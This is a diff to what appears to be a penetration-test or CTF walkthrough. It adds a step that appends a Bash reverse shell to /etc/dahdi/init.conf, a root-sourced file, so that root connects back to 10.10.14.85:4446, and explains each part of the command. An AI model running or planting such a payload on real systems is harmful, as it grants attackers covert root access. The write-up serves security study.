@@ -1235,7 +1235,26 @@ Start a second listener on a separate port to keep the root shell cleanly separa
   - Description: Same flags as the initial listener — listen, verbose, no DNS, on the specified port.
   - Purpose: Port 4446 is used rather than reusing 4444 to avoid conflicting with the active asterisk shell and to keep the two phases of the engagement clearly separated in the evidence trail.
 
-Append the reverse shell paylo
+Append the reverse shell payload to the writable, root-sourced configuration file:
+
+**Command:** `echo 'bash -c "bash -i >& /dev/tcp/10.10.14.85/4446 0>&1" &' >> /etc/dahdi/init.conf`
+
+**Breakdown:**
+
+- `echo '...'`
+  - Description: Prints the supplied string to standard output.
+  - Purpose: Generates the exact reverse shell one-liner to be written into the configuration file.
+- `bash -c "bash -i >& /dev/tcp/10.10.14.85/4446 0>&1"`
+  - Description: A Bash TCP reverse shell one-liner. -i opens an interactive shell; >& redirects both stdout and stderr over a TCP connection to the attacker's IP and port.
+  - Purpose: When executed as root by the sourcing chain, this opens a root interactive shell back to the waiting listener.
+- `&`
+  - Description: Backgrounds the reverse shell process.
+  - Purpose: Ensures the reverse shell does not block the rest of the DAHDI init script from completing — without it, the parent process could time out or be killed before the connection is established.
+- `>> /etc/dahdi/init.conf`
+  - Description: Appends standard output to the file without overwriting existing content.
+  - Purpose: Preserves the original configuration directives in init.conf so the DAHDI service continues to function normally, and places the payload on its own new line at the end.
+
+Result:
 <div align="center">
 <br>
 <br>
